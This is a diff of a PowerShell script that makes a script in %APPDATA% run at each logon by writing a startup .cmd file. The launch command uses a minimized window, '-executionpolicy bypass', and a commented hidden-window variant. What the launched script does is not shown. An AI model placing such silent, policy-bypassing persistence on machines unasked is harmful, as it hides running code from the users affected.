@@ -1,4 +1,4 @@
-[string]$Version = 2
+[string]$Version = 3
 #TODO update this version
 
 echo "Process script starting: $Pid"
@@ -40,11 +40,15 @@ New-Item -ItemType File -Path $StartupCmdPath -Force
 
 $path = $env:APPDATA #override
 $FolderName = "\Test\$Version\"
+
 $OrderPath = "$path"+"$FolderName"+"orders.ps1"
 $OrderPath
 
-$StartupCode = 'START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file "'+"$OrderPath"+'"
-REM /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -NoLogo -WindowStyle Hidden -file "'+"$OrderPath"+'"'
+#$ScriptPath = "$path"+"$FolderName"+"script.ps1"
+#$ScriptPath
+
+$StartupCode = 'START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file "'+"$OrderPath"+'"'
+#START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -NoLogo -WindowStyle Hidden -file "'+"$OrderPath"+'"'
 
 Add-Content $StartupCmdPath $StartupCode
 
